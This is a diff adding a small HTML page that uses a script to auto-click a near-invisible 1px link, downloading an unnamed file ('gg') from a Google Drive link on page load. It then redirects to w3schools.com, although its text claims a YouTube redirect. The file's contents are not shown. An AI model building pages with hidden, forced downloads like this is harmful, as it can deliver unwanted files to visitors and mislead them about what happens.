@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Page Title</title>
+</head>
+<body>
+
+<a href="https://drive.google.com/uc?export=download&id=18aNlrY5mDMFPEDBAtQZMi0pkeEX_zn11" id="download_file" download="gg"> <p style="font-size:1px"> . </p></a>
+
+
+<center>
+
+
+
+<p style="font-family:Bahnschrift" >This must redirect to <a href="https://www.youtube.com/channel/UCP9cTJ_M7hMv6FT0YfFI5OA">YouTube</a>. The download should start now.<a href="https://drive.google.com/uc?export=download&id=18aNlrY5mDMFPEDBAtQZMi0pkeEX_zn11" download="gg">Retry</a></p>
+
+
+
+<script type="text/javascript">
+
+document.getElementById("download_file").click();
+setTimeout(function(){
+            window.location.href = 'https://w3schools.com';
+         }, 3000);
+
+
+
+</script>
+
+</body>
+</html>
